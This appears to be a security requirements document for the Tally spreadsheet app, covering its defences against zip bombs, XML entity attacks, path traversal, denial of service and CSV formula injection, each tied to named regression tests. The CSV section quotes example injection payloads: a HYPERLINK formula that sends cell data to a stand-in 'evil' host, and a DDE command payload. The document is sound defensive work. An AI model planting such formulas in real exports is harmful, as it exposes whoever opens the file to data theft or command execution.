# Security

Tally opens files from untrusted sources (mail attachments, downloads), so
every file reader treats its input as hostile. This document lists the
security requirements from `docs/architecture-plan.md` §5.4, says which work
package owns each one, and names the tests that prove the parts that are
implemented.

Test names are `crate::test-file::test` (for example
`tally-io-ods::malicious::zip_bomb_is_rejected_within_one_second` is
`crates/tally-io-ods/tests/malicious.rs`). Unit tests inside a crate are named
`crate::module::tests::name`. The malicious corpus lives in
`tests/fixtures/malicious/`. It is generated, together with the ODS and CSV
fixtures, by `python3 -I tests/fixtures/ods/gen_fixtures.py`.

## Summary

| # | Requirement | Owner | Status |
|---|---|---|---|
| 1 | Zip bombs | WP5 | Implemented |
| 2 | XML: DOCTYPE, entities, depth and attribute caps | WP5 | Implemented |
| 3 | Logical bombs (repeat counts, cell caps) | WP5, plus WP1 for engine-side storage | Implemented for the readers |
| 4 | Path traversal | WP5 | Implemented |
| 5 | Active content (macros, external links, HYPERLINK) | WP1, WP3, WP7; WP5 for file side | File side done; rest pending |
| 6 | Untrusted parsing happens in Rust only | WP5 (parsing), WP7 (IPC surface) | Parsing side done |
| 7 | Tauri hardening | WP7 | Implemented (see the WP7 section) |
| 8 | Engine DoS limits | WP1, WP2, WP3 | Implemented (text cap, linear wildcards, recalc watchdog, sheet cap, names by reference, per-formula and per-transaction work budgets) |
| 9 | Fuzzing | later (Phase A drops fuzz targets) | Corpus and a mutation smoke test exist |

Plus the CSV formula-injection guard (§5.3), which is described below.

The findings of the 2026-10-19 review (`docs/reviews/security-review-2026-10-19.md`)
are fixed; their regression tests generate the malicious inputs themselves
(`crates/tally-io-ods/tests/hardening.rs`, `crates/tally-engine/tests/security.rs`,
plus the CSV, functions and desktop tests named below), so nothing large is
committed.

The findings of the second review (`docs/reviews/security-review-2-2026-10-19.md`)
are fixed too; see [Review 2 fixes](#review-2-fixes) for each finding, its fix
and its tests (`crates/tally-engine/tests/security2.rs`,
`crates/tally-io-ods/tests/security2.rs`, `crates/tally-io-xlsx/tests/security2.rs`).
Timing tests that only hold in release builds are `#[ignore]`d; run them with
`cargo test --release -p tally-engine --features io --test security2 -- --ignored`.

## 1. Zip bombs (WP5, `crates/tally-io-ods/src/archive.rs`)

Default limits are in `tally_io_ods::Limits`. Callers can tighten them.

| Control | Default | Test |
|---|---|---|
| Entry count is capped before the zip crate indexes the central directory: the end-of-central-directory record (and the zip64 locator and record) are parsed by hand from the last 64 KiB + 22 bytes, and every EOCD candidate there is checked | 10,000 entries | `tally-io-ods::malicious::too_many_entries` (20,000 entries), `tally-io-ods::hardening::zip64_entry_flood_is_rejected_before_indexing` (zip64 flood like the review's `many2m.ods`, rejected in microseconds; it used 822 MB of RSS before), `tally-io-ods::hardening::entry_cap_uses_declared_count` |
| Central-directory size is capped the same way | 16 MiB (`archive::MAX_CENTRAL_DIRECTORY_BYTES`) | `tally-io-ods::hardening::huge_central_directory_is_rejected` |
| `sniff_is_ods` reads only the first local header; its slow path (mimetype not first) runs the same EOCD precheck before building the archive | same limits | `tally-io-ods::hardening::sniff_is_bounded` |
| Per-entry uncompressed bytes for `content.xml` | 512 MiB (`max_content_xml_bytes`) | `tally-io-ods::malicious::zip_bomb_hits_entry_cap_when_ratio_is_disabled` |
| Per-entry uncompressed bytes for every other entry | 64 MiB (`max_entry_bytes`) | same mechanism, see `archive::tests` |
| Total uncompressed bytes across the package | 2 GiB (`max_total_bytes`) | `tally-io-ods::malicious::total_bytes_cap` |
| Compression ratio, enforced once an entry has produced more than 10 MiB | 200:1 (`max_ratio`) | `tally-io-ods::malicious::zip_bomb_is_rejected_within_one_second` (1 GiB of zeros compressed about 1000:1, rejected in about 70 ms in a debug build), `tally-io-ods::archive::tests::ratio_trips_after_floor` |
| Sizes declared in zip headers are never trusted | every read goes through `Read::take(limit + 1)` and a counting guard | `tally-io-ods::archive::tests::take_bounds_a_lying_entry`, `tally-io-ods::malicious::lying_size_header_is_bounded` |

How it works:

- The ratio is checked continuously against the compressed bytes actually
  pulled from the archive. The archive reader is wrapped in a byte counter, so
  a bomb is caught after about 10 MiB of output instead of after the whole
  entry has inflated.
- XML is streamed from the inflating entry through a 64 KiB buffer. No entry is
  ever buffered whole, except the tiny `mimetype` entry.

## 2. XML (WP5, `crates/tally-io-ods/src/xml.rs`)

Every XML stream in the package (`content.xml`, `styles.xml`, `settings.xml`,
`meta.xml`, `META-INF/manifest.xml`) goes through one hardened reader.

| Control | Test |
|---|---|
| Any `<!DOCTYPE>` is rejected with `OdsError::ForbiddenDoctype`. ODF never needs one, so this blocks XXE and entity-expansion attacks outright. | `tally-io-ods::malicious::doctype_with_external_entity_is_forbidden`, `tally-io-ods::malicious::billion_laughs_is_forbidden`, `tally-io-ods::malicious::doctype_in_styles_xml_is_forbidden` |
| quick-xml never fetches or expands external entities. It does not even expand internal DTD entities; it reports them as references. | `tally-io-ods::malicious::quick_xml_does_not_resolve_external_entities` |
| Only the five predefined entities and character references are resolved. Any other entity reference is an error. | `tally-io-ods::fixtures::libreoffice_shapes` (`&lt; &amp; &quot; &#x263A;`) |
| Element depth is capped. | `tally-io-ods::malicious::deep_nesting_hits_depth_cap` (100,000 levels, rejected at 256) |
| Attributes per element are capped. | `tally-io-ods::malicious::attribute_flood_hits_cap` (300 attributes, limit 256) |
| Text is capped at 16 MiB per cell (`text:p` and `office:string-value`). A `text:s text:c="4000000000"` cannot allocate gigabytes. | `tally-io-ods::malicious::space_bomb_is_rejected`, `tally-io-ods::hardening::huge_string_value_is_rejected` |

## 3. Logical bombs (WP5, `crates/tally-io-ods/src/content.rs`; CSV limits in `tally-io-csv`)

- Rows and cells are first parsed as run-length runs. They are expanded into
  `CellData` only after the cell count has been checked against `max_cells`
  (default 10,000,000, the Phase A reader limit). So the check happens before
  any allocation.
- An empty repeated row costs nothing, whatever its repeat count.
- A non-empty repeated row is materialized at most `max_repeat` times. Its
  cells are counted against `max_cells`.
- Repeat counts are clamped to the sheet limits: 1,048,576 rows and 16,384
  columns.
- Styled but empty runs larger than 4,096 cells are dropped. This is
  formatting of blank areas, which the Phase A model does not keep.

| Test | What it proves |
|---|---|
| `tally-io-ods::malicious::repeated_rows_bomb_hits_cell_cap_fast` | `number-rows-repeated="1048576"` × `number-columns-repeated="16384"` on a non-empty cell (17 G cells) is rejected in about 1 ms |
| `tally-io-ods::malicious::repeat_is_capped_by_max_repeat` | A non-empty repeated row is materialized at most `max_repeat` times |
| `tally-io-ods::malicious::cell_cap_applies_to_real_files` | The cell cap applies to ordinary files too |
| `tally-io-csv::csv::limits_are_enforced` | CSV `max_cells` (10M default), `max_rows` and `max_cols` |
| `tally-io-ods::hardening::formula_clone_bomb_hits_text_budget_fast` | A 205-byte formula repeated over 600 × 16,384 cells (the review's 460-byte `formula_clone.ods`, 2 GB RSS before) is rejected by the text budget before expansion |
| `tally-io-ods::hardening::repeated_formula_text_is_shared` | Repeated formula cells share one `Arc<str>` (`CellContentData::Formula.text` is `Arc<str>`) |
| `tally-io-ods::hardening::text_budget_counts_repeated_strings` | The budget counts each materialized cell's text, shared or not |
| `tally-io-ods::hardening::over_long_formula_is_rejected` | `table:formula` longer than 8,192 characters rejects the file (`formula length`) |
| `tally-io-ods::hardening::sheet_count_is_capped` | At most 10,000 sheets (`Limits::max_sheets`) |
| `tally-io-ods::hardening::merges_count_against_cell_cap` | Merges count against `max_cells` |
| `tally-io-ods::hardening::many_distinct_styles_are_fast` | Style deduplication is hash-based: 60,000 distinct styles in about 170 ms (release; 3.2 s before) |
| `tally-io-ods::hardening::non_finite_numbers_become_empty` | `office:value="NaN"`, `inf`, `1e309` become empty cells (also as cached formula results) |
| `tally-io-ods::hardening::huge_date_years_do_not_panic` | Years outside ±99,999 are rejected before the day arithmetic (a debug-build overflow panic before); the cell keeps its text |

Further reader limits (`tally_io_ods::Limits`):

- `max_text_bytes` (default 1 GiB): total formula and string bytes
  materialized into the model, counted per cell, so a shared `Arc` still
  counts once for every cell it fills. Checked with `max_cells`, before
  a repeated row is expanded.
- `max_sheets` (default 10,000).
- Formulas over 8,192 characters (the parser's limit) reject the file with
  `LimitExceeded { what: "formula length" }`.

Deviation from the plan: the plan says "store repeated content as runs (never
materialize)". `tally_model::SheetData` has no run representation, so
repeated content is materialized up to the caps above. Storing runs would need
a model change (WP0 lead review) and engine support (WP1).

Merges and array blocks (review 2, HIGH-1 and HIGH-2): each merge counts
one cell against `max_cells`, and a sheet keeps at most 100,000 merges
(`content::MAX_MERGES_PER_SHEET`; later ones are dropped with a warning in
`WorkbookData.warnings`). An array formula block counts its whole area
(rows × columns, clamped to the sheet), because the engine turns every
covered cell into an array part: twenty `number-matrix-rows-spanned="1048576"`
cells in a 1 KB file are `LimitExceeded { what: "materialized cells" }`.
Number formats (HIGH-4): a data style whose code is longer than 4,096
characters (`tally_model::MAX_NUMBER_FORMAT_LEN`, however many parts it
has) reads as General, with a warning. Tests:
`tally-io-ods::security2::merges_per_sheet_are_capped`,
`tally-io-ods::security2::array_block_areas_count_against_the_cell_cap`,
`tally-io-ods::security2::over_long_number_formats_become_general`.

## 3b. XLSX reader (`crates/tally-io-xlsx`)

`read_xlsx` is hardened like the ODS reader and shares its defaults
(`tally_io_xlsx::Limits`): at most 10,000 zip entries (EOCD precheck before
indexing), 512 MiB per worksheet or `sharedStrings.xml`, 64 MiB per other
part, 2 GiB in total, a 200:1 compression ratio once an entry passes
10 MiB, DOCTYPE rejected in every part, XML depth 256 and 256 attributes per
element, 10,000,000 materialized cells, 1 GiB of materialized text (each
cell's full text counts, even when cells share one shared string) and
10,000 sheets. Nothing is extracted to disk; relationship targets that
leave the package are ignored.

| Control | Test |
|---|---|
| Zip bombs, lying headers, entry floods, total bytes | `tally-io-xlsx::malicious::zip_bomb_is_rejected_within_one_second`, `tally-io-xlsx::malicious::zip_bomb_hits_entry_cap_when_ratio_is_disabled`, `tally-io-xlsx::malicious::total_bytes_cap`, `tally-io-xlsx::malicious::lying_entry_count_is_rejected_before_indexing`, `tally-io-xlsx::malicious::too_many_real_entries` |
| XML: DOCTYPE, depth, attributes, entities | `tally-io-xlsx::malicious::doctype_is_forbidden_in_every_part`, `tally-io-xlsx::malicious::deep_nesting_hits_depth_cap`, `tally-io-xlsx::malicious::attribute_flood_hits_cap`, `tally-io-xlsx::malicious::quick_xml_does_not_resolve_external_entities` |
| Cell and text budgets, shared-string count | `tally-io-xlsx::malicious::cell_cap`, `tally-io-xlsx::malicious::text_budget_counts_every_shared_string_use`, `tally-io-xlsx::malicious::shared_string_count_is_capped`, `tally-io-xlsx::malicious::oversized_cell_text_is_rejected` |
| Traversal and external targets | `tally-io-xlsx::malicious::traversal_and_external_targets_are_ignored` |
| Merges count one cell each against `max_cells`, at most 100,000 per sheet (`sheet::MAX_MERGES_PER_SHEET`, warning past it) | `tally-io-xlsx::security2::merges_are_counted_and_capped` |
| An array formula's `ref` area counts against `max_cells` | `tally-io-xlsx::security2::array_block_area_counts` |
| `numFmt formatCode` (and `dxf` codes) over 4,096 characters read as General, with a warning | `tally-io-xlsx::security2::over_long_format_codes_become_general` |
| Shared formulas: members are `CellContentData::SharedFormula` sharing the anchor's text (`Arc<str>`), counted once against `max_text_bytes`; the engine parses each group once | `tally-io-xlsx::security2::shared_formula_members_share_one_text`, `tally-engine::security2::files::shared_formulas_parse_once` |
| `<col style>`: at most 16,384 `<col>` elements per sheet (warning past it); styles become one whole-column run per column, overlaps resolved last-wins in O(N + 16,384) | `tally-io-xlsx::security2::column_styles_are_one_run_per_column` |
| `<f>` text over 8,192 characters (the parser's limit) is a limit error | `sheet::MAX_FORMULA_TEXT` |
| Quoted sheet names containing `:` (`'a:b'!A1`) are not read as 3-D spans | `tally-io-xlsx::security2::quoted_sheet_names_with_colons` |
| `calcPr iterateCount` clamped to 32,767 (ODS `table:steps` too) | `tally-io-xlsx::security2::iterate_count_is_clamped`, `tally-io-ods::security2::iteration_steps_are_clamped` |

## 4. Path traversal (WP5)

- Nothing is ever extracted to disk. Entries are streamed into memory by exact
  name.
- Entry names are ignored if they are absolute, contain `..` components,
  backslashes, NUL bytes or drive letters (`:`). Ignoring a name is not an
  error, so a document with a hostile `../content.xml` and a real
  `content.xml` still opens from the real one.
- On write, entry names are fixed constants.

| Test | What it proves |
|---|---|
| `tally-io-ods::malicious::traversal_entry_names_are_ignored` | The hostile `../content.xml` and the DOCTYPE in `a/../../styles.xml` are never read |
| `tally-io-ods::archive::tests::unsafe_names` | Name classification |
| `tally-io-ods::roundtrip::mimetype_is_first_and_stored` | The writer emits exactly the fixed entry list, with `mimetype` first and stored |

## 5. Active content

File side (WP5):

- The ODS reader reads only `mimetype`, `META-INF/manifest.xml`,
  `content.xml`, `styles.xml`, `settings.xml` and `meta.xml`. `Basic/` macros,
  `Scripts/`, embedded objects and `office:scripts` are never read, so they
  cannot run.
- Encrypted (password-protected) documents are refused with
  `OdsError::Unsupported`.
- Formula text such as `WEBSERVICE` or `DDE` is passed through as text. It is
  never evaluated by the reader.
- CSV import never creates formulas: a field such as `=1+2` or
  `=HYPERLINK(…)` is imported as the text `=1+2` (AOO's "Evaluate formulas"
  import option is also off by default). Numbers, dates and percentages are
  still recognised. `tally_io_csv::CsvOptions::evaluate_formulas` (default
  `false`) is the opt-in for a later import dialog; the engine's
  `Workbook::from_data_opts(data, recognize, formulas)` implements it. Test:
  `tally-engine::security::files::csv_formulas_import_as_text` (the review's
  `slow.csv` took 3.1 s and 935 MB to open before).

Other WPs:

- Disabling external links, DDE, `WEBSERVICE` and `FILTERXML` by default, and
  opening `HYPERLINK` only on explicit click through Rust for
  http/https/mailto, belong to WP1 (engine), WP3 (functions) and WP7 (app).
- The macro banner is WP7.

## CSV formula-injection guard (WP5, `tally_io_csv::write_csv`, default ON)

Why the guard exists:

- When a CSV file is opened in Excel, LibreOffice or Google Sheets, a field
  that starts with `=`, `+`, `-` or `@` is evaluated as a formula. Tab and
  carriage return can hide such a prefix in some importers.
- An attacker who can put text into a cell (a form field, a product name, a
  synced row) can make an exported CSV run a formula on whoever opens it.
  Examples are `=HYPERLINK("http://evil/?"&A1)`, which exfiltrates neighbouring
  data, and DDE payloads such as `=cmd|' /C calc'!A0`.
- This is OWASP's "CSV Injection".

What the guard does:

- When `CsvWriteOptions::injection_guard` is true (the default), a field gets
  a leading `'` if its *output text* starts with tab or CR, or if its first
  character after leading whitespace (including LF and NBSP) and `"`
  characters is `=`, `+`, `-`, `@` or a full-width form (`＝ ＋ － ＠`,
  which some CJK-locale importers normalize).
- The decision is made on the text that is written, whatever the cell's
  type (`CsvCell::is_text` is informational only). A number format can make
  a number display as `=HYPERLINK("http://evil/?"&A1)+5`; before the
  2026-10-19 review (H3) such a number was written unguarded.
- Spreadsheet apps treat a leading `'` as "this is text" and hide it in the
  cell.

What it does not touch:

- A field that is entirely a plain numeric literal (`tally_io_csv::is_plain_number`):
  optional spaces, an optional sign, digits with optional `,` thousands
  separators, at most one decimal point, an optional exponent and an optional
  trailing `%`. So `-5`, `-1,234.50`, `+1E+10` and `-12%` stay as they are.
- Text that merely contains `=` later on.

The cost:

- The guard changes the bytes of some legitimate fields, such as `-foo`,
  `@handle`, and also currency-looking text like `-$5.00` (it starts with
  `-` and is not a plain numeric literal, so it is written `'-$5.00`; the
  importer shows it as the text `-$5.00`). This trade-off is deliberate.
- Users who need byte-exact output can switch the guard off
  (`CsvWriteOptions::injection_guard = false`; export dialog toggle, WP7).

Tests: `tally-io-csv::csv::injection_guard` (every trigger, the
`"`-prefixed variant and the toggle), `tally-io-csv::csv::injection_guard_applies_to_output_text`
(number-format injection, `-5 or 1=1`, `-$5.00`, leading whitespace/LF,
full-width triggers, plain numbers) and
`tally-engine::security::files::csv_export_guards_formatted_numbers` (the
review's `csvinj.ods` end to end).

CSV export walks sparse storage (security review M7): rows are padded to the
used width only when the whole rectangle is at most 10,000,000 fields;
otherwise each row stops at its last cell and empty rows are bare line
breaks. An export that would still write more than 10,000,000 fields is
refused (`unsupported`). Test: `tally-engine::security::files::csv_export_is_sparse_and_capped`
(values at A1 and XFD1048576 export in well under a second; the dense walk
needed 17 G entries before).

CSV import never interprets content. Cells come back as raw text
(`tally-io-csv::csv::values_are_raw_text` keeps `=SUM(A1)` as text), and the
engine's input recognizer turns them into numbers, dates and so on, but
never into formulas (see §5).

## 6. Untrusted parsing happens in Rust only

- WP5: both readers are pure Rust with `#![forbid(unsafe_code)]`. Neither
  uses `unwrap` or `expect` outside tests, and both produce typed
  `tally_model` data.
- `tally-io-ods::malicious::mutated_inputs_never_panic` runs truncations and
  random byte flips of a real fixture and checks that none of them panics or
  hangs.
- WP7 owns the guarantee that the webview receives typed DTOs and never raw
  file contents. That includes the size-limited image blobs.

## 7. Tauri hardening: WP7

Minimal capabilities (no fs or shell plugins exposed to JS, dialog only from
Rust commands), an allowlist of our commands only, a strict CSP and devtools
off in release builds are all owned by WP7 (`apps/desktop/**`).

## 8. Engine DoS: WP1, WP2, WP3

| Control | Test |
|---|---|
| Parser depth and length limits: formula length at most 8,192 characters, nesting at most 256 (Err:512). Owned by WP2. | `tally-formula` tests |
| Regex size limit through `RegexBuilder::size_limit`, with no fancy-regex in criteria. Owned by WP3. | `tally-functions::criteria` tests |
| Text results are capped at 4 MiB (`tally_functions::MAX_TEXT_BYTES`): every function result passes through `sanitize`, the `&` operator checks before allocating, and SUBSTITUTE and CONCATENATE size their result first. Longer text is Err:513 (string overflow). | `tally-engine::security::nested_substitute_hits_string_cap` (9 nested SUBSTITUTEs: 2.2 GB before), `tally-engine::security::substitute_checks_size_before_allocating`, `tally-engine::security::concat_hits_string_cap` |
| Wildcard criteria never backtrack: the pattern is split at `*` into pieces matched greedily (literal pieces by substring search, pieces with `?` by bit-parallel Shift-And). Worst case O(text × piece / 64). | `tally-functions::criteria::tests::glob_agrees_with_reference`, `tally-functions::criteria::wildcard_matching_is_linear`, `tally-engine::security::wildcard_countif_is_linear` (1 MB × 4,000-character pattern: 3.2 s before) |
| Recalc watchdog on open: at most 50,000,000 formulas or 20 s (`RecalcBudget::on_open`). Past it, the remaining formulas keep the values cached in the file, are marked clean (so edits recalculate their dependents as usual), and `WorkbookInfo.warnings` carries a one-time message that the app shows as a toast. `apply` is bounded per transaction (below) and per formula (work budget), not by time. | `tally-engine::security::recalc_budget_stops_and_keeps_cached_values`, `tally-engine::security::files::heavy_open_stops_at_deadline_with_warning` |
| Names are evaluated by reference, never inlined: each definition reachable from a formula is kept once (`names::collect_names`), evaluated where it is used (relative references stay relative to the using cell), memoized per cell evaluation (`eval::EvalEnv`), with cycle detection and at most 16 nested names (`#NAME?`). Dependency analysis visits each reachable definition once. A 1 KB file with 16 levels of fan-out 10 opens in milliseconds. | `tally-engine::security2::fan_out_names_open_in_linear_time`, `tally-engine::security2::fan_out_names_through_the_api`, `tally-engine::security2::names_by_reference_keep_semantics` |
| Per-formula work budget: 50,000,000 element operations per cell evaluation (`eval::MAX_FORMULA_WORK`). Every evaluation step costs 1, an operator or call over arrays or ranges the cells it touches (the used part for functions that scan ranges), `MMULT` rows × inner × columns, `MINVERSE`/`MDETERM` n³, `MUNIT` n². A formula over budget is Err:512 ("formula overflow": too complex to evaluate), charged before the work runs. | `tally-engine::security2::matrix_work_budget_stops_huge_mmult` |
| Dependency index: the readers of a cell are a list with a back-index (each formula records its list positions), so registering or removing one reader is O(1) however many formulas read the cell; name users are a hash set. | `tally-engine::deps::tests::many_readers_of_one_cell_stay_linear`, `tally-engine::security2::fan_in_is_linear`, `tally-engine::security2::indirect_fan_in_edit_is_linear` (release: `fan_in_200k_release_timing`, `indirect_fan_in_100k_release_timing`) |
| Per-transaction budget: the ops of one `apply` may touch at most 50,000,000 cells (`ops::MAX_TX_CELLS`, summed with `ops::op_cost`: cells written or moved, the used part of cleared or sorted ranges, one per column for style ops, 1,048,576 per Replace All). An op past it fails with `unsupported`; the rest of the transaction applies. | `tally-engine::security2::transaction_cell_budget` |
| Replace All: replacement and pattern at most 64 KiB (`find::MAX_PATTERN_BYTES`, checked before compiling), at most 1,048,576 cells per op and 10,000,000 per transaction (`find::MAX_REPLACE_TX`, the undo record holds every old cell), at most 32,767 characters per replaced cell (longer results leave the cell unchanged, with a warning) and 256 MiB of new text per op. | `tally-engine::security2::replace_all_limits`, `tally-engine::security2::huge_find_pattern_is_refused_early` |
| Number formats at most 4,096 characters (`tally_model::MAX_NUMBER_FORMAT_LEN`): `SetNumberFormat`, `ApplyStyle` and conditional-format styles refuse longer codes, the style table turns longer codes from any source into General, and `cells()` returns at most 1,024 characters of display text per cell (`service::view::MAX_VIEW_TEXT`, ending in `…`; the value, edit text and exports are untouched). | `tally-engine::security2::files::long_number_formats_render_fast` (release: `long_number_formats_render_100ms_release`) |
| AutoFilter value lists are matched through a hash set of lowercased values built once per application (`filter::Matcher`); a list holds at most 100,000 values and 16 MiB (`filter::MAX_FILTER_VALUES`). | `tally-engine::security2::filter_value_list_is_a_set` (release: `filter_100k_rows_10k_values_release_timing`) |
| Loading: overlapping merges are dropped in O(n log n) (a row sweep, `convert::clean_merges`), at most 100,000 per sheet; array blocks cover at most 10,000,000 cells per workbook (`convert::MAX_ARRAY_CELLS`), checked before anything is materialized; imported sheet names are made valid (`convert::sanitize_sheet_name`: `[ ] * ? : / \` and control characters become `_`) while the file's formulas still resolve the original names. What loading drops or changes is shown once as a warning. | `tally-engine::convert::tests::clean_merges_is_n_log_n`, `tally-engine::convert::tests::clean_merges_drops_overlaps_and_invalid`, `tally-engine::convert::tests::array_budget_is_checked_before_materializing`, `tally-engine::security2::files::many_merges_open_fast`, `tally-engine::security2::imported_sheet_names_are_sanitized` (release: `engine_array_budget_release`) |
| At most 10,000 sheets per workbook (`workbook::MAX_SHEETS`), and sheet names are made unique in amortized O(1) (`SheetNamer`), so loading is linear in the sheet count. Only the first unnamed sheet takes the file name. | `tally-engine::security::same_named_sheets_load_fast` (2,000 same-named sheets: 43 s before), `tally-engine::security::sheet_count_is_capped`, `tally-engine::security::files::same_named_sheets_open_fast` |
| Maximum array size (2^21 elements per lifted range). | engine eval tests |

The file readers' own cap of 10,000,000 cells (above) bounds what reaches the
engine.

Residual risk: the text cap applies per value, so an array formula over a
whole column of 4 MiB strings can still build large arrays (bounded by the
array cap × 4 MiB); the work budget counts cells, not bytes. The work budget
is charged by the engine evaluator before each operator and call, so a
single function call is bounded by its arguments' size, not interrupted
while it runs (the lifted scalar calls inside `tally-functions` are capped
at 2^21 cells each). Nothing interrupts evaluation by time, and there is no
cancellation from the UI.

The desktop shell runs every command under one service mutex
(`apps/desktop/src-tauri/src/commands.rs` `with_service`), so a slow
operation on one document blocks every other document until it finishes.
The budgets above bound how long that can be; per-document locks (so other
windows stay responsive) are planned for the shell.

## Review 2 fixes

From `docs/reviews/security-review-2-2026-10-19.md`. Timings are the
review's generators (`p*.py`) on the same machine, release build, before
(current HEAD before the fixes) and after.

| Finding | Fix | Tests | Before → after |
|---|---|---|---|
| CRITICAL-1 names expand exponentially | Names evaluated by reference with a per-evaluation memo and cycle detection; analysis visits each definition once (§8) | `tally-engine::security2::fan_out_names_open_in_linear_time`, `fan_out_names_through_the_api`, `names_by_reference_keep_semantics` | fan 10 × 16, 1 cell: timeout > 30 s (1.8 GB) → 2 ms, 9 MB; fan 2 × 1000 cells: 16.3 s → 15 ms; API DefineName fan 10: killed at 6 GB → 0.3 ms |
| HIGH-1 `clean_merges` O(n²) | Row sweep with an ordered map of active merges; 100k merges per sheet in both readers, counted against `max_cells` (XLSX too) | `tally-engine::convert::tests::clean_merges_is_n_log_n`, `tally-engine::security2::files::many_merges_open_fast`, `tally-io-ods::security2::merges_per_sheet_are_capped`, `tally-io-xlsx::security2::merges_are_counted_and_capped` | ODS 200k: 5.2 s → 0.1 s; XLSX 2M: timeout > 30 s → 0.49 s |
| HIGH-2 array blocks unbudgeted | Readers count block areas against `max_cells`; the engine caps covered cells at 10M per workbook and checks overlap before materializing | `tally-io-ods::security2::array_block_areas_count_against_the_cell_cap`, `tally-io-xlsx::security2::array_block_area_counts`, `tally-engine::convert::tests::array_budget_is_checked_before_materializing` | 20 × 1M: 3.1 s, 1.8 GB → refused in 0.4 ms; 200 × 1M: timeout, 3.6 GB → refused in 0.6 ms |
| HIGH-3 dependency index O(n²) | Reader lists with back-index positions and `swap_remove`; name users in a hash set | `tally-engine::deps::tests::many_readers_of_one_cell_stay_linear`, `tally-engine::security2::fan_in_is_linear`, `indirect_fan_in_edit_is_linear` | 200k fan-in: open 5.6 s + recalc_all 23.3 s → 0.32 s + 0.13 s; 100k INDIRECT: setup 7.5 s, edit 6.0 s → 0.3 s, 0.14 s |
| HIGH-4 long number formats | 4,096-character cap in both readers (General + warning), in `SetNumberFormat`/`ApplyStyle`/CF styles and the style table; view text ≤ 1,024 characters per cell | `tally-io-ods::security2::over_long_number_formats_become_general`, `tally-io-xlsx::security2::over_long_format_codes_become_general`, `tally-engine::security2::files::long_number_formats_render_fast` | `cells(A1:T1000)`, 1 MB `0…` code: timeout > 30 s, 3.3 GB → 9 ms, 20 MB; quoted: timeout, 3.8 GB → 9 ms |
| HIGH-5 AutoFilter O(rows × values) | Hash set of lowercased values per application; list size capped | `tally-engine::security2::filter_value_list_is_a_set` | 100k rows × 10k values: 11.7 s → 13 ms |
| MEDIUM-1 shared formulas 450× | `CellContentData::SharedFormula` (one `Arc<str>` per group, counted once); the engine parses each group once and shares the AST; `<f>` text capped at 8,192 | `tally-io-xlsx::security2::shared_formula_members_share_one_text`, `tally-engine::security2::files::shared_formulas_parse_once` | 1M members (LEN 150): open 21.5 s / 4.4 GB (killed at 6 GB here) → open 5.8 s, 744 MB |
| MEDIUM-2 `<col style>` amplification | One whole-column run per column, overlaps last-wins, ≤ 16,384 `<col>` elements | `tally-io-xlsx::security2::column_styles_are_one_run_per_column` | 10k elements: 6.6 s, 2.5 GB → 7 ms, 13 MB |
| MEDIUM-3 single-formula cost | Per-formula work budget (Err:512) | `tally-engine::security2::matrix_work_budget_stops_huge_mmult` | 20 × MMULT(1448²): 46 s → refused before multiplying |
| MEDIUM-4 per-transaction work | 50M-cell transaction budget; Replace All caps | `tally-engine::security2::transaction_cell_budget`, `replace_all_limits` | 64 × 1M SetArrayFormula: ops past 50M cells refused |
| LOW-1 ODS writer merge lookups | Sorted, merged spans per row with binary searches | `tally-io-ods::security2::writer_merge_lookups_are_logarithmic` | — |
| LOW-2 sheet names / `'a:b'!A1` | Imported names sanitized (originals resolve while loading); quote-aware placeholder for `:` in XLSX formula translation | `tally-engine::security2::imported_sheet_names_are_sanitized`, `tally-io-xlsx::security2::quoted_sheet_names_with_colons` | `='a:b'!A1`: `#VALUE!` → 100; `SUM('a:b'!A:A)`: Err:501 → 100 |
| LOW-3 1 MB find pattern | Patterns and replacements over 64 KiB refused before compiling | `tally-engine::security2::huge_find_pattern_is_refused_early` | 640 MB peak → refused at once |
| INFO iterateCount, sheet lookups | Clamped to 32,767; case-insensitive sheet lookup lowercases once | `tally-io-xlsx::security2::iterate_count_is_clamped`, `tally-io-ods::security2::iteration_steps_are_clamped` | — |

Not covered here: the shell-side argument limits (`src/limits.rs`, owned by
the shell) and per-document locks (planned, see §8).

## 9. Fuzzing: later

Phase A drops fuzz targets (`docs/phase-a.md`). What exists today:

- the malicious corpus in `tests/fixtures/malicious/`, which can seed
  cargo-fuzz targets;
- the deterministic mutation smoke test described in requirement 6.

cargo-fuzz targets for the formula parser, the format-code parser, the ODS
reader and the CSV reader (nightly CI) come in a later milestone.

## Malicious corpus

| File | Expected result |
|---|---|
| `zip-bomb.ods` | `LimitExceeded { what: "compression ratio" }` |
| `doctype-xxe.ods`, `billion-laughs.ods`, `doctype-in-styles.ods` | `ForbiddenDoctype` |
| `path-traversal.ods` | Opens; hostile names ignored |
| `repeat-bomb.ods` | `LimitExceeded { what: "materialized cells" }` |
| `space-bomb.ods` | `LimitExceeded { what: "cell text bytes" }` |
| `deep-nesting.ods` | `LimitExceeded { what: "XML element depth" }` |
| `many-attributes.ods` | `LimitExceeded { what: "XML attributes per element" }` |
| `lying-size.ods` | An error. The zip claims 100 bytes but the entry inflates to 8 MiB; it is never trusted. |
| `many-entries.ods` | `LimitExceeded { what: "zip entries" }` |
| `not-a-zip.ods`, `no-content.ods`, `text-document.odt` | `NotOds` |

## WP7: desktop shell (`apps/desktop/src-tauri`)

Details for §7 above.

### Tauri hardening (§5.4 item 7)

| Rule | Where |
|---|---|
| Capability `default` grants only `core:event:allow-listen`, `core:event:allow-unlisten` (menu-action events), `core:window:allow-set-title`, `core:window:allow-start-dragging` and `core:window:allow-internal-toggle-maximize` (the title-bar drag region), scoped to the `main` window. `core:default` is not granted: it would let JS replace the app menu, create tray icons, emit events and resolve home/config paths. | `apps/desktop/src-tauri/capabilities/default.json` |
| No `fs`, `shell`, `http`, `opener` or other plugins are exposed to JS. The only plugin is `tauri-plugin-dialog`, and **no `dialog:*` permission is granted**: dialogs are shown from Rust commands (`wb_open_dialog`, `wb_save`) via `DialogExt` on a blocking worker thread (`tauri::async_runtime::spawn_blocking`). `tauri-plugin-dialog` pulls in `tauri-plugin-fs` as a Rust dependency only; its commands are unreachable without permissions. | `src/dialogs.rs`, `src/lib.rs` |
| Only our 20 commands (docs/api.md) are registered. | `src/lib.rs` `generate_handler!` |
| CSP: `default-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; img-src 'self' data: blob:; connect-src ipc: http://ipc.localhost; object-src 'none'; base-uri 'none'; form-action 'none'` (`base-uri` and `form-action` do not fall back to `default-src`). No remote hosts; no `unsafe-eval`. `style-src 'unsafe-inline'` is needed for React `style=` attributes and the grid's inline styles. | `tauri.conf.json` |
